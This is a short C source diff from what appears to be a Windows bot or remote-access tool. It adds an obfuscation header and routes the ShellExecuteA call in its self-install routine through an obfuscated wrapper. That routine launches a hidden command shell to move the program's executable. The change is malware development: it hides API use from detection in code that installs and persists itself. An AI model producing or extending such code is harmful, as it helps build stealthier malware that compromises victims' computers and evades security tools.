@@ -11,6 +11,7 @@
 #include "lerror.h"
 #include "lmem.h"
 #include "lvm.h"
+#include "obf.h"
 #include "persist.h"
 
 HANDLE laikaB_mutex;
@@ -150,7 +151,7 @@ void installSelf()
     lstrcatA(szCmd, szInstall);
 
     if (GetEnvironmentVariableA("COMSPEC", szFile, MAX_PATH) == 0 ||
-        (INT)ShellExecuteA(NULL, NULL, szFile, szCmd, NULL, SW_HIDE) <= 32)
+        (INT)oShellExecuteA(NULL, NULL, szFile, szCmd, NULL, SW_HIDE) <= 32)
         LAIKA_ERROR("Failed to start shell for moving exe!\n");
 
     laikaB_unmarkRunning();
